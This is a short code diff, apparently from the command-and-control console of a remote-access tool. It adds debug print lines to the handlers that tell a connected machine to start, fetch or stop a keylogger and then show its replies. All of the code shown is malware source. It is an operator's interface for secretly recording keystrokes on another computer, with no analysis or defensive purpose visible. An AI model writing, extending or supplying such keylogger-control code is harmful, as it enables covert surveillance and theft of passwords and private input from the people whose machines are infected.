@@ -164,6 +164,7 @@ def send_commands():
         elif lcmd == "keylogger start":
             conn.send(str.encode(lcmd))
             keylogger_start_response = str(conn.recv(99999), "utf-8")
+            print(keylogger_start_response)
             if keylogger_start_response == "exists":
                 print(bcolors.RED + '[-] Keylogger already exsists. Type "keylogger reset" to restart the keylogger log')
             else:
@@ -171,6 +172,7 @@ def send_commands():
         elif lcmd == "keylogger get":
             conn.send(str.encode(lcmd))
             keylogger_get_response = str(conn.recv(99999), "utf-8")
+            print(keylogger_get_response)
             if keylogger_get_response == "nan":
                 print(bcolors.RED + '[-] Keylogger does not exsists. Type "keylogger start" to start a keylogger')
             else:
@@ -183,6 +185,7 @@ def send_commands():
         elif lcmd == "keylogger end":
             conn.send(str.encode(lcmd))
             keylogger_end_response = str(conn.recv(99999), "utf-8")
+            print(keylogger_end_response)
             if keylogger_end_response == "nan":
                 print(bcolors.RED + '[-] Keylogger does not exsist')
             else:
